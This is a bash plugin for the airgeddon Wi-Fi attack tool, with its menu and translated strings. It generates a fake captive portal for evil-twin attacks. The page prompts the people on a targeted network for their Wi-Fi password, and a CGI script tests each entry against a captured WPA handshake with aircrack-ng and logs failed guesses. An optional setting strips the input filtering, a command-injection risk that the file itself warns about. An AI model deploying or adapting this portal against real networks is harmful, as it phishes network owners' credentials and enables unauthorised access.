#!/usr/bin/env bash

# Custom-Portals airgeddon plugin

# Version:    0.2.1
# Author:     KeyofBlueS
# Repository: https://github.com/KeyofBlueS/airgeddon-plugins
# License:    GNU General Public License v3.0, https://opensource.org/licenses/GPL-3.0

# airgeddon Repository: https://github.com/v1s1t0r1sh3r3/airgeddon

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Custom-Portals"
plugin_description="Use Your own captive portals"
plugin_author="KeyofBlueS"

plugin_enabled=1

plugin_minimum_ag_affected_version="10.30"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

################################# USER CONFIG SECTION #################################

# Put Your custom captive portal files in a directory of Your choice
# Default is plugins/custom_portals/PORTAL_FOLDER/PORTAL_FILES
# Example:
custom_portals_dir="${scriptfolder}${plugins_dir}custom_portals/"
# You can have multiple PORTAL_FOLDER, then choose one of them inside airgeddon itself.
# Take a look at custom_portals/<EXAMPLES> for custom captive portal examples.

# *** WARNING ***
# Enabling the detection of passwords containing *&/?<> characters is very dangerous as
# injections can be done on captive portal page and the hacker could be hacked by some
# kind of command injection on the captive portal page.
# ACTIVATE AT YOUR OWN RISK!

############################## END OF USER CONFIG SECTION ##############################

#Copy custom captive portal files.
function custom_portals_override_set_captive_portal_page() {

	debug_print

	if [[ "${copy_custom_portal}" -eq "1" ]]; then
		cp -r "${custom_portals_dir}${custom_portal}/"* "${tmpdir}${webdir}"
		unset copy_custom_portal
	fi

	if [[ ! -f "${tmpdir}${webdir}${cssfile}" ]]; then
		{
		echo -e "body * {"
		echo -e "\tbox-sizing: border-box;"
		echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
		echo -e "}\n"
		echo -e ".button {"
		echo -e "\tcolor: #ffffff;"
		echo -e "\tbackground-color: #1b5e20;"
		echo -e "\tborder-radius: 5px;"
		echo -e "\tcursor: pointer;"
		echo -e "\theight: 30px;"
		echo -e "}\n"
		echo -e ".content {"
		echo -e "\twidth: 100%;"
		echo -e "\tbackground-color: #43a047;"
		echo -e "\tpadding: 20px;"
		echo -e "\tmargin: 15px auto 0;"
		echo -e "\tborder-radius: 15px;"
		echo -e "\tcolor: #ffffff;"
		echo -e "}\n"
		echo -e ".title {"
		echo -e "\ttext-align: center;"
		echo -e "\tmargin-bottom: 15px;"
		echo -e "}\n"
		echo -e "#password {"
		echo -e "\twidth: 100%;"
		echo -e "\tmargin-bottom: 5px;"
		echo -e "\tborder-radius: 5px;"
		echo -e "\theight: 30px;"
		echo -e "}\n"
		echo -e "#password:hover,"
		echo -e "#password:focus {"
		echo -e "\tbox-shadow: 0 0 10px #69f0ae;"
		echo -e "}\n"
		echo -e ".bold {"
		echo -e "\tfont-weight: bold;"
		echo -e "}\n"
		echo -e "#showpass {"
		echo -e "\tvertical-align: top;"
		echo -e "}\n"
		echo -e "@media screen (min-width: 1000px) {"
		echo -e "\t.content {"
		echo -e "\t\twidth: 50%;"
		echo -e "\t}"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${cssfile}"
	fi

	if [[ ! -f "${tmpdir}${webdir}${jsfile}" ]]; then
		{
		echo -e "(function() {\n"
		echo -e "\tvar onLoad = function() {"
		echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
		echo -e "\t\tif (formElement != null) {"
		echo -e "\t\t\tvar password = document.getElementById(\"password\");"
		echo -e "\t\t\tvar showpass = function() {"
		echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
		echo -e "\t\t\tvar validatepass = function() {"
		echo -e "\t\t\t\tif (password.value.length < 8) {"
		echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t\telse {"
		echo -e "\t\t\t\t\tformElement.submit();"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
		echo -e "\t\t}"
		echo -e "\t};\n"
		echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
		echo -e "})();\n"
		echo -e "function redirect() {"
		echo -e "\tdocument.location = \"${indexfile}\";"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${jsfile}"
	else
		check_ampersand "${et_misc_texts[${captive_portal_language},16]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},16]}*${captive_portal_text}*g" "${tmpdir}${webdir}${jsfile}"
		sed -i "s#\${indexfile}#"${indexfile}"#g" "${tmpdir}${webdir}${jsfile}"
	fi

	if [[ ! -f "${tmpdir}${webdir}${indexfile}" ]]; then
		{
		echo -e "#!/usr/bin/env bash"
		echo -e "echo '<!DOCTYPE html>'"
		echo -e "echo '<html>'"
		echo -e "echo -e '\t<head>'"
		echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
		echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
		echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
		echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
		echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
		echo -e "echo -e '\t</head>'"
		echo -e "echo -e '\t<body>'"
		echo -e "echo -e '\t\t<div class=\"content\">'"
		echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"${checkfile}\">'"
		echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
		echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
		echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
		echo -e "echo -e '\t\t\t\t</div>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
		echo -e "echo -e '\t\t\t\t<label>'"
		echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\"/><br/>'"
		echo -e "echo -e '\t\t\t\t</label>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
		echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},13]}\"/>'"
		echo -e "echo -e '\t\t\t</form>'"
		echo -e "echo -e '\t\t</div>'"
		echo -e "echo -e '\t</body>'"
		echo -e "echo '</html>'"
		echo -e "exit 0"
		} >> "${tmpdir}${webdir}${indexfile}"
	else
		check_ampersand "${et_misc_texts[${captive_portal_language},15]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},15]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},9]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},9]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},10]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},10]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},11]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},11]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},12]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},12]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},13]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},13]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${essid}"
		sed -i "s#\${essid}#${captive_portal_text//[\`\']/}#g" "${tmpdir}${webdir}${indexfile}"
		sed -i "s#\${cssfile}#"${cssfile}"#g" "${tmpdir}${webdir}${indexfile}"
		sed -i "s#\${jsfile}#"${jsfile}"#g" "${tmpdir}${webdir}${indexfile}"
		sed -i "s#\${checkfile}#"${checkfile}"#g" "${tmpdir}${webdir}${indexfile}"
		if grep -q "ESSID_HERE" "${tmpdir}${webdir}${indexfile}"; then
			if echo "${essid}" | grep -Fq "&"; then
				essid=$(echo "${essid}" | sed -e 's/[\/&]/\\&/g')
			fi
			sed -i "s/ESSID_HERE/${essid//[\`\']/}/g" "${tmpdir}${webdir}${indexfile}"
		fi
		if cat "${tmpdir}${webdir}${indexfile}" | grep -q "TITLE_HERE"; then
			sed -i "s/TITLE_HERE/${et_misc_texts[${captive_portal_language},15]}/g" "${tmpdir}${webdir}${indexfile}"
		fi
	fi

	if [[ ! -f "${tmpdir}${webdir}${checkfile}" ]]; then
		exec 4>"${tmpdir}${webdir}${checkfile}"

		cat >&4 <<-EOF
			#!/usr/bin/env bash
			echo '<!DOCTYPE html>'
			echo '<html>'
			echo -e '\t<head>'
			echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
			echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
			echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
			echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
			echo -e '\t</head>'
			echo -e '\t<body>'
			echo -e '\t\t<div class="content">'
			echo -e '\t\t\t<center><p>'
		EOF

		cat >&4 <<-'EOF'
			POST_DATA=$(cat /dev/stdin)
			if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
				POST_DATA=${POST_DATA#*=}
				password=${POST_DATA/+/ }
				password=${password//[*&\/?<>]}
				password=$(printf '%b' "${password//%/\\x}")
				password=${password//[*&\/?<>]}
			fi

			if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
		EOF

		cat >&4 <<-EOF
				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
		EOF

		cat >&4 <<-'EOF'
				echo "${password}" >\
		EOF

		cat >&4 <<-EOF
				"${tmpdir}${webdir}${currentpassfile}"
				aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
		EOF

		cat >&4 <<-'EOF'
				if [ "$?" = "0" ]; then
		EOF

		cat >&4 <<-EOF
					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
					echo '${et_misc_texts[${captive_portal_language},18]}'
					et_successful=1
				else
		EOF

		cat >&4 <<-'EOF'
					echo "${password}" >>\
		EOF

		cat >&4 <<-EOF
					"${tmpdir}${webdir}${attemptsfile}"
					echo '${et_misc_texts[${captive_portal_language},17]}'
					et_successful=0
				fi
		EOF

		cat >&4 <<-'EOF'
			elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
		EOF

		cat >&4 <<-EOF
				echo '${et_misc_texts[${captive_portal_language},26]}'
				et_successful=0
			else
				echo '${et_misc_texts[${captive_portal_language},14]}'
				et_successful=0
			fi
			echo -e '\t\t\t</p></center>'
			echo -e '\t\t</div>'
			echo -e '\t</body>'
			echo '</html>'
		EOF

		cat >&4 <<-'EOF'
			if [ ${et_successful} -eq 1 ]; then
				exit 0
			else
				echo '<script type="text/javascript">'
				echo -e '\tsetTimeout("redirect()", 3500);'
				echo '</script>'
				exit 1
			fi
		EOF

		exec 4>&-
	else
		check_ampersand "${et_misc_texts[${captive_portal_language},15]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},15]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},18]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},18]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},17]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},17]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},26]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},26]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},14]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},14]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${cssfile}#"${cssfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${jsfile}#"${jsfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${bssid}#"${bssid}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${tmpdir}#"${tmpdir}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${webdir}#"${webdir}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${currentpassfile}#"${currentpassfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${et_handshake}#"${et_handshake}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${et_successfile}#"${et_successfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${attemptsfile}#"${attemptsfile}"#g" "${tmpdir}${webdir}${checkfile}"
	fi


	if [[ "${custom_portals_full_password}" = "true" ]]; then
		echo
		language_strings "${language}" "custom_portals_text_11" "red"
		if grep -Fq 'password=${password//[*&\/?<>]}' "${tmpdir}${webdir}${checkfile}"; then
  			unset lines_to_delete_argument
			lines_to_delete="$(grep -Fn 'password=${password//[*&\/?<>]}' "${tmpdir}${webdir}${checkfile}" | awk -F':' '{print $1}')"
			for line_to_delete in ${lines_to_delete}; do
				lines_to_delete_argument="${lines_to_delete_argument}${line_to_delete}d;"
			done
			sed -i "${lines_to_delete_argument}" "${tmpdir}${webdir}${checkfile}"
		fi
		unset custom_portals_full_password
	fi

	sleep 3
}

#Chek for ampersand to escepe
function check_ampersand() {

	captive_portal_text="${1}"

	if echo "${captive_portal_text}" | grep -Fq "&"; then
		captive_portal_text=$(echo "${captive_portal_text}" | sed -e 's/[\/&]/\\&/g')
	fi
}

#Custom captive portal selection menu
function custom_portals_prehook_set_captive_portal_language() {

	debug_print

	standard_portal_text="this_is_the_standard_portal_text"
	while true; do
		clear
		language_strings "${language}" 293 "title"
		print_iface_selected
		print_et_target_vars
		print_iface_internet_selected
		echo
		language_strings "${language}" "custom_portals_text_0" "green"
		print_simple_separator

		echo "${standard_portal_text}" > "${tmpdir}ag.custom_portals.txt"
		ls -d1 -- "${custom_portals_dir}"*/ 2>/dev/null | rev | awk -F'/' '{print $2}' | rev | sort >> "${tmpdir}ag.custom_portals.txt"
		local i=1
		while IFS=, read -r exp_folder; do

			if [[ -d "${custom_portals_dir}${exp_folder}" ]] || [[ "${exp_folder}" = "${standard_portal_text}" ]]; then
				if [[ "${exp_folder}" = "${standard_portal_text}" ]]; then
					language_strings "${language}" "custom_portals_text_1"
				else
					i=$((i + 1))

					if [ ${i} -le 9 ]; then
						sp1=" "
					else
						sp1=""
					fi

					portal=${exp_folder}
					echo -e "${sp1}${i}) ${portal}"
				fi
			fi
		done < "${tmpdir}ag.custom_portals.txt"

		unset selected_custom_portal
		echo
		if ! cat "${tmpdir}ag.custom_portals.txt" | grep -Exvq "${standard_portal_text}$"; then
			language_strings "${language}" "custom_portals_text_2" "yellow"
			language_strings "${language}" "custom_portals_text_3" "yellow"
			echo_brown "${custom_portals_dir}PORTAL_FOLDER/PORTAL_FILES"
		fi
		read -rp "> " selected_custom_portal
		if [[ ! "${selected_custom_portal}" =~ ^[[:digit:]]+$ ]] || [[ "${selected_custom_portal}" -gt "${i}" ]] || [[ "${selected_custom_portal}" -lt 1 ]]; then
			echo
			language_strings "${language}" "custom_portals_text_4" "red"
			language_strings "${language}" 115 "read"
		else
			break
		fi
	done
	if [[ "${selected_custom_portal}" -eq 1 ]]; then
		copy_custom_portal=0
		custom_portal='Standard'
	else
		copy_custom_portal=1
		custom_portal="$(sed -n "${selected_custom_portal}"p "${tmpdir}ag.custom_portals.txt")"
	fi
	rm "${tmpdir}ag.custom_portals.txt"

	while true; do
		clear
		language_strings "${language}" 293 "title"
		print_iface_selected
		print_et_target_vars
		print_iface_internet_selected
		echo
		language_strings "${language}" "custom_portals_text_5" "yellow"
		echo_yellow "${custom_portal}"
		echo 
		language_strings "${language}" "custom_portals_text_6" "green"
		language_strings "${language}" "custom_portals_text_7" "red"
		print_simple_separator
		language_strings "${language}" "custom_portals_text_8" "green"
		language_strings "${language}" "custom_portals_text_9" "red"
		print_simple_separator
		read -rp "> " full_password

		case $full_password in
			1)
				custom_portals_full_password='false'
				language_strings "${language}" "custom_portals_text_10" "green"
				break
			;;
			2)
				custom_portals_full_password='true'
				language_strings "${language}" "custom_portals_text_11" "red"
				break
			;;
			*)
				echo
				language_strings "${language}" "custom_portals_text_12" "red"
				language_strings "${language}" 115 "read"
			;;
		esac
	done

	language_strings "${language}" 115 "read"

}

#Custom function. Create text messages to be used in custom portals plugin
function initialize_custom_portals_language_strings() {

	debug_print

	declare -gA arr
	arr["ENGLISH","custom_portals_text_0"]="Select Your captive portal:"
	arr["SPANISH","custom_portals_text_0"]="\${pending_of_translation} Seleccione su portal cautivo:"
	arr["FRENCH","custom_portals_text_0"]="\${pending_of_translation} Sélectionnez votre portail captif:"
	arr["CATALAN","custom_portals_text_0"]="\${pending_of_translation} Seleccioneu el vostre portal en captivitat:"
	arr["PORTUGUESE","custom_portals_text_0"]="\${pending_of_translation} Selecione Seu portal cativo:"
	arr["RUSSIAN","custom_portals_text_0"]="\${pending_of_translation} Выберите свой портал:"
	arr["GREEK","custom_portals_text_0"]="\${pending_of_translation} Επιλέξτε την δεσμευμένη πύλη σας:"
	arr["ITALIAN","custom_portals_text_0"]="Seleziona il captive portal:"
	arr["POLISH","custom_portals_text_0"]="\${pending_of_translation} Wybierz swój portal dla niewoli:"
	arr["GERMAN","custom_portals_text_0"]="\${pending_of_translation} Wählen Sie Ihr Captive-Portal aus:"
	arr["TURKISH","custom_portals_text_0"]="\${pending_of_translation} Esir portalınızı seçin:"
	arr["ARABIC","custom_portals_text_0"]="\${pending_of_translation} حدد البوابة المقيدة الخاصة بك"

	arr["ENGLISH","custom_portals_text_1"]=" 1) Standard"
	arr["SPANISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Estándar"
	arr["FRENCH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["CATALAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Estàndard"
	arr["PORTUGUESE","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Padrão"
	arr["RUSSIAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} стандарт"
	arr["GREEK","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Πρότυπο"
	arr["ITALIAN","custom_portals_text_1"]=" 1) Standard"
	arr["POLISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["GERMAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["TURKISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standart"
	arr["ARABIC","custom_portals_text_1"]="\${pending_of_translation} 1) اساسي"

	arr["ENGLISH","custom_portals_text_2"]="No custom captive portals found!"
	arr["SPANISH","custom_portals_text_2"]="\${pending_of_translation} ¡No se encontraron portales cautivos personalizados!"
	arr["FRENCH","custom_portals_text_2"]="\${pending_of_translation} Aucun portail captif personnalisé trouvé!"
	arr["CATALAN","custom_portals_text_2"]="\${pending_of_translation} No s’han trobat portals en captivitat personalitzats!"
	arr["PORTUGUESE","custom_portals_text_2"]="\${pending_of_translation} Não foram encontrados portais cativos personalizados!"
	arr["RUSSIAN","custom_portals_text_2"]="\${pending_of_translation} Не найдено ни одного пользовательского портала!"
	arr["GREEK","custom_portals_text_2"]="\${pending_of_translation} Δεν βρέθηκαν προσαρμοσμένες πύλες δέσμιας!"
	arr["ITALIAN","custom_portals_text_2"]="Nessun captive portal personalizzato trovato!"
	arr["POLISH","custom_portals_text_2"]="\${pending_of_translation} Nie znaleziono niestandardowych portali typu captive!"
	arr["GERMAN","custom_portals_text_2"]="\${pending_of_translation} Keine benutzerdefinierten Captive-Portale gefunden!"
	arr["TURKISH","custom_portals_text_2"]="\${pending_of_translation} Özel sabit portal bulunamadı!"
	arr["ARABIC","custom_portals_text_2"]="\${pending_of_translation} لم يتم العثور على بوابات مقيدة مخصصة"

	arr["ENGLISH","custom_portals_text_3"]="Please put Your custom captive portal files in:"
	arr["SPANISH","custom_portals_text_3"]="\${pending_of_translation} Coloque sus archivos de portal cautivo personalizados en:"
	arr["FRENCH","custom_portals_text_3"]="\${pending_of_translation} Veuillez placer vos fichiers de portail captif personnalisés dans:"
	arr["CATALAN","custom_portals_text_3"]="\${pending_of_translation} Si us plau, introduïu els fitxers de portal personalitzat en captivitat a:"
	arr["PORTUGUESE","custom_portals_text_3"]="\${pending_of_translation} Coloque seus arquivos de portal em cativeiro personalizados em:"
	arr["RUSSIAN","custom_portals_text_3"]="\${pending_of_translation} Пожалуйста, поместите Ваши пользовательские файлы портала в:"
	arr["GREEK","custom_portals_text_3"]="\${pending_of_translation} Τοποθετήστε τα προσαρμοσμένα αρχεία της πύλης δεσμευμένων σε:"
	arr["ITALIAN","custom_portals_text_3"]="Inserisci i file dei captive portal personalizzati in:"
	arr["POLISH","custom_portals_text_3"]="\${pending_of_translation} Proszę umieścić własne niestandardowe pliki portalu w:"
	arr["GERMAN","custom_portals_text_3"]="\${pending_of_translation} Bitte legen Sie Ihre benutzerdefinierten Captive-Portal-Dateien in:"
	arr["TURKISH","custom_portals_text_3"]="\${pending_of_translation} Lütfen özel esir portal dosyalarınızı buraya yerleştirin:"
	arr["ARABIC","custom_portals_text_3"]="\${pending_of_translation} يرجى وضع ملفات المدخل المقيدة المخصصة الخاصة بك في"

	arr["ENGLISH","custom_portals_text_4"]="Invalid captive portal was chosen!"
	arr["SPANISH","custom_portals_text_4"]="\${pending_of_translation} ¡Se eligió el portal cautivo no válido!"
	arr["FRENCH","custom_portals_text_4"]="\${pending_of_translation} Un portail captif non valide a été choisi!"
	arr["CATALAN","custom_portals_text_4"]="\${pending_of_translation} El portal captiu no és vàlid!"
	arr["PORTUGUESE","custom_portals_text_4"]="\${pending_of_translation} Portal cativo inválido foi escolhido!"
	arr["RUSSIAN","custom_portals_text_4"]="\${pending_of_translation} Выбран неверный портал!"
	arr["GREEK","custom_portals_text_4"]="\${pending_of_translation} Επιλέχθηκε μη έγκυρη πύλη αιχμαλωσίας!"
	arr["ITALIAN","custom_portals_text_4"]="Scelta non valida!"
	arr["POLISH","custom_portals_text_4"]="\${pending_of_translation} Wybrano nieprawidłowy portal dla niewoli!"
	arr["GERMAN","custom_portals_text_4"]="\${pending_of_translation} Es wurde ein ungültiges Captive-Portal ausgewählt!"
	arr["TURKISH","custom_portals_text_4"]="\${pending_of_translation} Geçersiz esir portal seçildi!"
	arr["ARABIC","custom_portals_text_4"]="\${pending_of_translation} تم اختيار بوابة مقيدة غير صالحة"

	arr["ENGLISH","custom_portals_text_5"]="Captive portal choosen:"
	arr["SPANISH","custom_portals_text_5"]="\${pending_of_translation} Portal cautivo elegido:"
	arr["FRENCH","custom_portals_text_5"]="\${pending_of_translation} Portail captif choisi:"
	arr["CATALAN","custom_portals_text_5"]="\${pending_of_translation} Portal captiu escollit:"
	arr["PORTUGUESE","custom_portals_text_5"]="\${pending_of_translation} Portal cativo escolhido:"
	arr["RUSSIAN","custom_portals_text_5"]="\${pending_of_translation} Пленный портал выбран:"
	arr["GREEK","custom_portals_text_5"]="\${pending_of_translation} Επιλεγμένη πύλη αιχμαλωσίας:"
	arr["ITALIAN","custom_portals_text_5"]="Captive portal selezionato:"
	arr["POLISH","custom_portals_text_5"]="\${pending_of_translation} Wybrany portal dla niewoli:"
	arr["GERMAN","custom_portals_text_5"]="\${pending_of_translation} Captive Portal ausgewählt:"
	arr["TURKISH","custom_portals_text_5"]="\${pending_of_translation} Seçilen esir portalı:"
	arr["ARABIC","custom_portals_text_5"]="\${pending_of_translation} تم اختيار بوابة مقيدة"

	arr["ENGLISH","custom_portals_text_6"]="Do you want to enable the detection of passwords containing *&/?<> characters?"
	arr["SPANISH","custom_portals_text_6"]="\${pending_of_translation} ¿Desea habilitar la detección de contraseñas que contengan caracteres *&/?<> ?"
	arr["FRENCH","custom_portals_text_6"]="\${pending_of_translation} Voulez-vous activer la détection des mots de passe contenant des caractères *&/?<> ?"
	arr["CATALAN","custom_portals_text_6"]="\${pending_of_translation} Voleu habilitar la detecció de contrasenyes que contenen caràcters *&/?<> ?"
	arr["PORTUGUESE","custom_portals_text_6"]="\${pending_of_translation} Deseja habilitar a detecção de senhas contendo caracteres *&/?<> ?"
	arr["RUSSIAN","custom_portals_text_6"]="\${pending_of_translation} Вы хотите включить обнаружение паролей, содержащих символы *&/?<> ?"
	arr["GREEK","custom_portals_text_6"]="\${pending_of_translation} Θέλετε να ενεργοποιήσετε τον εντοπισμό κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<>"
	arr["ITALIAN","custom_portals_text_6"]="Vuoi abilitare il rilevamento delle password contenenti i caratteri *&/?<> ?"
	arr["POLISH","custom_portals_text_6"]="\${pending_of_translation} Czy chcesz włączyć wykrywanie haseł zawierających znaki *&/?<> ?"
	arr["GERMAN","custom_portals_text_6"]="\${pending_of_translation} Möchten Sie die Erkennung von Passwörtern aktivieren, die *&/?<> Zeichen enthalten?"
	arr["TURKISH","custom_portals_text_6"]="\${pending_of_translation} *&/?<> karakterlerini içeren parolaların algılanmasını etkinleştirmek istiyor musunuz?"
	arr["ARABIC","custom_portals_text_6"]="\${pending_of_translation} هل تريد تمكين اكتشاف كلمات المرور التي تحتوي على أحرف * & /؟ <>؟"

	arr["ENGLISH","custom_portals_text_7"]="WARNING: Enabling the detection of passwords containing *&/?<> characters is very dangerous as injections can be done on captive portal page and the hacker could be hacked by some kind of command injection on the captive portal page. ACTIVATE AT YOUR OWN RISK!"
	arr["SPANISH","custom_portals_text_7"]="\${pending_of_translation} ADVERTENCIA: Habilitar la detección de contraseñas que contienen caracteres *&/?<> es muy peligroso ya que se pueden realizar inyecciones en la página del portal cautivo y el hacker podría ser pirateado mediante algún tipo de inyección de comando en la página del portal cautivo. ¡ACTÍVALO BAJO TU PROPIO RIESGO!"
	arr["FRENCH","custom_portals_text_7"]="\${pending_of_translation} AVERTISSEMENT: Activer la détection des mots de passe contenant des caractères *&/?<> est très dangereux car des injections peuvent être effectuées sur la page du portail captif et le pirate pourrait être piraté par une sorte d'injection de commande sur la page du portail captif. ACTIVEZ À VOS PROPRES RISQUES!"
	arr["CATALAN","custom_portals_text_7"]="\${pending_of_translation} ADVERTÈNCIA: Habilitar la detecció de contrasenyes que contenen caràcters *&/?<> és molt perillós, ja que les injeccions es poden fer a la pàgina del portal captiu i el pirata informàtic podria ser piratejat mitjançant algun tipus d'injecció d'ordres a la pàgina del portal captiu. ACTIVA AL TEU PROPI RISC!"
	arr["PORTUGUESE","custom_portals_text_7"]="\${pending_of_translation} AVISO: Habilitar a detecção de senhas contendo caracteres *&/?<> é muito perigoso, pois as injeções podem ser feitas na página do portal cativo e o hacker pode ser invadido por algum tipo de injeção de comando na página do portal cativo. ATIVE POR SUA CONTA E RISCO!"
	arr["RUSSIAN","custom_portals_text_7"]="\${pending_of_translation} ПРЕДУПРЕЖДЕНИЕ: Включение обнаружения паролей, содержащих символы *&/?<> , очень опасно, так как инъекции могут быть выполнены на странице авторизованного портала, и хакер может быть взломан путем внедрения какой-либо команды на странице авторизованного портала. АКТИВИРУЙТЕ НА СВОЙ РИСК!"
	arr["GREEK","custom_portals_text_7"]="\${pending_of_translation} ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Η ενεργοποίηση της ανίχνευσης κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<> είναι πολύ επικίνδυνη, καθώς μπορούν να γίνουν εγχύσεις στη σελίδα της πύλης και ο χάκερ μπορεί να παραβιαστεί με κάποιου είδους ένεση εντολών στη σελίδα της πύλης αποκλειστικής χρήσης. ΕΝΕΡΓΟΠΟΙΗΣΤΕ ΜΕ ΔΙΚΗ ΣΑΣ ΕΥΘΥΝΗ!"
	arr["ITALIAN","custom_portals_text_7"]="ATTENZIONE: abilitare il rilevamento di password contenenti i caratteri *&/?<> è molto pericoloso in quanto delle injection possono essere eseguite sulla pagina del captive portal e l'hacker potrebbe essere violato da una sorta di command injection nella pagina del captive portal. ATTIVALA A TUO RISCHIO!"
	arr["POLISH","custom_portals_text_7"]="\${pending_of_translation} OSTRZEŻENIE: Włączenie wykrywania haseł zawierających znaki *&/?<> jest bardzo niebezpieczne, ponieważ wstrzyknięcia można wykonać na stronie portalu przechwytującego, a haker może zostać zhakowany przez wstrzyknięcie polecenia na stronie portalu przechwytującego. AKTYWUJ NA WŁASNE RYZYKO!"
